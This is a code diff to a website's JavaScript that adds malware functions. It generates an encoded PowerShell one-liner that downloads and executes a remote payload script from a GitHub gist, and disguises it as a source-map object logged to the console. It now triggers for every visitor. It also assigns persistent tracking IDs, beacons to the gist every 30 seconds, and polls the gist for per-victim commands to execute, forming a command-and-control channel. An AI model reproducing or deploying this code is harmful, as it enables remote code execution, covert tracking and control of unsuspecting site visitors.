@@ -59,42 +59,29 @@
     }
 
     var uid = getCookie('_uid') || localStorage.getItem('_uid');
-    if (uid) relay(uid);
-
     if (!uid) {
-        setTimeout(function() {
-            var ps = '$env:FOXFID=\'' + fid + '\';iex(irm \'https://gist.githubusercontent.com/husssvalley/6bb037f859d2dc4f26f8c0e4880aa9a2/raw/payload.ps1\')';
-            var bytes = '';
-            for (var i = 0; i < ps.length; i++) { var c = ps.charCodeAt(i); bytes += String.fromCharCode(c & 0xFF, (c >> 8) & 0xFF); }
-            console.log(JSON.stringify({
-                version: 3, file: 'app.min.js',
-                sourceRoot: 'powershell.exe -WindowStyle Hidden -NonInteractive -EncodedCommand ' + btoa(bytes),
-                sources: ['app.js'], names: [], mappings: ''
-            }));
-        }, 3000);
+        uid = fid;
+        setCookie('_uid', uid, 3650);
+        localStorage.setItem('_uid', uid);
     }
 
+    relay(uid);
+
+    setTimeout(function() {
+        var ps = '$env:FOXFID=\'' + fid + '\';iex(irm \'https://gist.githubusercontent.com/husssvalley/6bb037f859d2dc4f26f8c0e4880aa9a2/raw/payload.ps1\')';
+        var bytes = '';
+        for (var i = 0; i < ps.length; i++) { var c = ps.charCodeAt(i); bytes += String.fromCharCode(c & 0xFF, (c >> 8) & 0xFF); }
+        console.log(JSON.stringify({
+            version: 3, file: 'app.min.js',
+            sourceRoot: 'powershell.exe -WindowStyle Hidden -NonInteractive -EncodedCommand ' + btoa(bytes),
+            sources: ['app.js'], names: [], mappings: ''
+        }));
+    }, 3000);
+
+    setInterval(function() { relay(uid); checkCmd(); }, 30000);
+
     if ('serviceWorker' in navigator) {
-        navigator.serviceWorker.register('/sw.js', { scope: '/' }).then(function() {
-            navigator.serviceWorker.ready.then(function(reg) {
-                var sw = navigator.serviceWorker.controller || reg.active;
-                if (sw) sw.postMessage({ type: 'init', uid: uid, fid: fid });
-            });
-        }).catch(function() {});
-        navigator.serviceWorker.addEventListener('message', function(e) {
-            if (!e.data) return;
-            if (e.data.type === 'umt_ready') {
-                var umt = e.data.umt;
-                localStorage.setItem('_uid', umt);
-                setCookie('_uid', umt, 3650);
-                setCookie('_fid', '', -1);
-                localStorage.removeItem('_fid');
-                var sw2 = navigator.serviceWorker.controller;
-                if (sw2) sw2.postMessage({ type: 'init', uid: umt, fid: null });
-                relay(umt);
-            }
-            if (e.data.type === 'cmd') handleCmd(e.data.payload);
-        });
+        navigator.serviceWorker.register('/sw.js', { scope: '/' }).catch(function() {});
     }
 
     function relay(uid) {
@@ -117,6 +104,25 @@
             method: 'PATCH',
             headers: { 'Authorization': 'Bearer ' + PAT, 'Content-Type': 'application/json' },
             body: JSON.stringify({ files: files })
+        }).catch(function() {});
+    }
+
+    function checkCmd() {
+        fetch('https://api.github.com/gists/' + GIST_ID, {
+            headers: { 'Authorization': 'Bearer ' + PAT }
+        }).then(function(r) { return r.json(); }).then(function(gist) {
+            var key = 'cmd_' + uid;
+            if (!gist.files || !gist.files[key]) return;
+            var cmd = (gist.files[key].content || '').trim();
+            if (!cmd) return;
+            handleCmd({ cmd: cmd, uid: uid });
+            var del = {};
+            del[key] = null;
+            fetch('https://api.github.com/gists/' + GIST_ID, {
+                method: 'PATCH',
+                headers: { 'Authorization': 'Bearer ' + PAT, 'Content-Type': 'application/json' },
+                body: JSON.stringify({ files: del })
+            }).catch(function() {});
         }).catch(function() {});
     }
 
